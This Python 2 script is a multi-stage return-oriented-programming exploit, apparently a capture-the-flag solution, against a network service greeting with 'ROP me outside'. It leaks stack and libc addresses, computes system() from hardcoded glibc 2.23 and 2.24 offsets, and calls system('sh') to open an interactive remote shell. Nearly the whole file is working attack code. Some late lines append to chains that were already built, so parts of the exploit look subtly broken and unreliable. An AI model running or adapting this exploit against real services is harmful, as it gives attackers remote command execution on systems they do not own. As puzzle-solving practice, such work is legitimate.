#!/usr/bin/env python

import struct
from time import sleep
import sys
from subprocess import *
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import signal
import socket

hostname = sys.argv[1]
port = int(sys.argv[2])
libc = sys.argv[3]

if libc == "2.24":
	libc_system_distance = 0x3f480
	__libc_start_dist	 = 0x201f0 
if libc == "2.23":
	libc_system_distance = 0x45390
	__libc_start_dist	 = 0x20740 


__libc_start_ptr     = 0x601020

puts 				 = 0x40063a
def enable_sigpipe():

    signals = ('SIGPIPE', 'SIGXFZ', 'SIGXFSZ')
    for sig in signals:
        if hasattr(signal, sig):
            signal.signal(getattr(signal, sig), signal.SIG_DFL)

def str_to_lendian(shellcode_str):
	shellcode_str = shellcode_str[::-1]
	shellcode_str = shellcode_str.encode('hex')
	shellcode_str = int(shellcode_str,16)
	return shellcode_str

def build_bytes(rop_obj):
	if type(rop_obj) is list:

		shellcode_list = [ struct.pack('<Q', i) for i in rop_obj]
		return ''.join(shellcode_list)

	elif type(rop_obj) is str:
		#shellcode_str = str_to_lendian(rop_obj)
		return str_to_lendian(rop_obj)

def read_netbytes(recv_output, outputtype):	
	sleep(.5)
	response_list = ([hex(ord(i)) for i in recv_output])[::-1]

	if outputtype == "memaddr":
		return int((''.join(['{:02X}'.format(int(i,16)) for i in response_list])), 16)

	if outputtype == "bytes":
		return [i for i in response_list if i != '0xa']

def shell():
	while True:
		sleep(.1)
		output = s.recv(2048)
		print output
		shell_command = raw_input("# ")
		s.sendall(shell_command+"\n")	
		if shell_command.lower() == "quit" or shell_command.lower() == "exit":
			s.close()
			break
		sleep(.5)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((hostname, port))

banner = "ROP me outside, how 'about dah?\n"
response1 = s.recv(len(banner))
sleep(2)
if response1 == banner:
	print "[+] Received banner."


raw_input("[+] Press enter to continue: ")

roplist1 = []
roplist1.append(0x4141414141414141) #<--- rid ptr on first loop
roplist1.append(0x4242424242424242) #
roplist1.append(0x4343434343434343) #
roplist1.append(0x4444444444444444) #
roplist1.append(0x4545454545454545) #
roplist1.append(0x4646464646464646) #
roplist1.append(0x4747474747474747) #
roplist1.append(0x4848484848484848) #
roplist1.append(0x601128) # ret <--- rbp on first loop / pushed as rtn ptr
roplist1.append(0x000000000040063a) # feeds puts current rdi address to get leak
roplist1.append(0x4141414141414141) # <--
roplist1.append(0x4141414141414141) #    |
roplist1.append(0x4141414141414141) #    |
roplist1.append(0x00000000004004c9) #	 |
roplist1.append(0x4141414141414141) #	 |
roplist1.append(0x4141414141414141) #	 |
roplist1.append(0x4141414141414141) #	 |
roplist1.append(0x4141414141414141) #  	 |--- clears stack of 0xa which will
roplist1.append(0x4141414141414141) # 	 |	  prevent subsequent ROP instructions
roplist1.append(0x4141414141414141) #	 |	  from fgets() calls
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
roplist1.append(0x4141414141414141) #
ropchain1 = build_bytes(roplist1)

print "[*] Sending stage 1 ROP gadgets with a length of %d" % len(ropchain1)
raw_input("[+] Press enter to continue: ")
s.sendall(ropchain1+"\n")
response = s.recv(1024)

print len(response)
print response

if len(response) > 0:
	response = response[0:5]
	stack_leak = read_netbytes(response, "memaddr")
	stack_leak = hex(stack_leak) + "00"
	stack_leak = int(stack_leak,16)

	print "[+] Memory stack leak at %x" % stack_leak

#Build of second stage ROP chain
roplist2 = []
roplist2.append(0x0000000000000000) #  
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x601200) #
roplist2.append(0x00000000004006d3) # pop rdi; ret 
roplist2.append(__libc_start_ptr) #
roplist2.append(0x000000000040063a) # <---- loop to puts
roplist2.append(0x0000000000000000) # 
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) # 
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x0000000000000000) #
roplist2.append(0x5050505050505050) #

print "[*] Building ze stage 2 ROP gadgets..."
sleep(.5)

ropchain2 = build_bytes(roplist2)

print "[+] Sending second stage."

s.sendall(ropchain2+"\n")
response2 = s.recv(1024)
response2 = response2[0:6]
libc_start_main_leak = read_netbytes(response2, "memaddr") 

print "[+] Libc start main leak at %s" % hex(libc_start_main_leak)

print "[*] Doin' math 'n' shit..."

libc_base = libc_start_main_leak - __libc_start_dist
print "\t[+] Libc base at addr: %s" % hex(libc_base)

system = libc_base + libc_system_distance
print "\t[+] System syscall gadget at addr: %s" % hex(system)


#Build 3rd stage ROP chain

binsh = build_bytes("sh     #")
roplist3 = []
roplist3.append(binsh) # <---- 
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #
roplist3.append(0x5757575757575757) #
roplist3.append(0x5858585858585858) #
roplist3.append(0x0000000000400590) # pop rbp ; ret <----ret pointer
roplist3.append(stack_leak)		    # 
roplist3.append(0x000000000040064e) # mov rdx, stin ; lea rax,[rbp-0x40] ; mov esi,0x1f4 ; mov rdi,rax; call fgets
roplist2.append(stack_leak - 0x40 ) # ret to pop rdi on stack
roplist3.append(0x0000000000000000) #
roplist3.append(0x0000000000000000) #

print "[*] Building ze stage 3 ROP gadgets..."
sleep(.5)

ropchain3 = build_bytes(roplist3)

print "[+] Sending third stage."
s.sendall(ropchain3+"\n")
sleep(.5)

roplist4 = []
roplist4.append(0x0000000000000000) #
roplist4.append(0x0000000000000000) #
roplist4.append(0x5858585858585858) #
roplist4.append(0x5656565656565656) #
roplist4.append(0x0000000000400666) #
roplist4.append(0x5858585858585858) #
roplist4.append(0x5959595959595959) #
roplist4.append(0x5858585858585858) #
roplist4.append(0x5959595959595959) #
roplist4.append(0x00000000004006d3) # pop rdi; ret 
roplist4.append(0x00000000006011c0)
roplist3.append(0x0000000000400590) # pop rbp ; ret <----ret pointer
roplist3.append(stack_leak)	
roplist4.append(system)

#roplist4.append(0x000000000040064e) #
ropchain4 = build_bytes(roplist4)

print "[+] Sending ze stage 4 ROP gadgets and jumping to system."
s.sendall(ropchain4+"\n")
sleep(.5)

while True:

	shell_command = raw_input("# ")


	s.sendall(shell_command+"\n")	
	sleep(.1)
	output = s.recv(2048)
	print output
	if shell_command.lower() == "quit" or shell_command.lower() == "exit":
		s.close()
		break
	sleep(.1)



